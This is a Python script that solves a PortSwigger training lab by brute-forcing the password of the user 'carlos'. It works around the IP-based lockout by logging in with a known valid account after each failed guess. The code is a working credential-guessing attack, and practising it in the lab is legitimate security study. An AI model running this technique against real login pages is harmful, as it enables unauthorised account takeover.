# https://portswigger.net/web-security/authentication/password-based/lab-broken-bruteforce-protection-ip-block
# The login is unlocked if a correct login attempt is done,  so we eventually need to enter the correct credentials

import urllib3
import urllib
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def bruteForce(url):

    username = "carlos"

    print("[ + ] Starting password bruce force on user %s..." % (username))
 
    passwordFile = open('passwords.txt', 'r')
    linesPassword = passwordFile.read().splitlines()
    for line in linesPassword:

        params = { 
                "username": username, 
                "password": line, 
            }
        
        rPassword = requests.post(url, verify=False, proxies=proxies, data=params, allow_redirects=False)

        sys.stdout.write('\r' + "Testing password: " + line)
        print(" "*50, end='\r', flush=True)


        if rPassword.status_code == 302:
            password = line
            print("\n\n------------------------------------")
            print("Password found: " + password)
            print("------------------------------------")
            print("\nCredentials: %s - %s" % (username, password))
            break
        
        # If the password is incorrect, use the correct credentials to avoid being locked out
        params = { 
        "username": "wiener", 
        "password": "peter", 
        }

        rPassword = requests.post(url, verify=False, proxies=proxies, data=params)

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    bruteForce(url)

if __name__ == "__main__":
    main() 
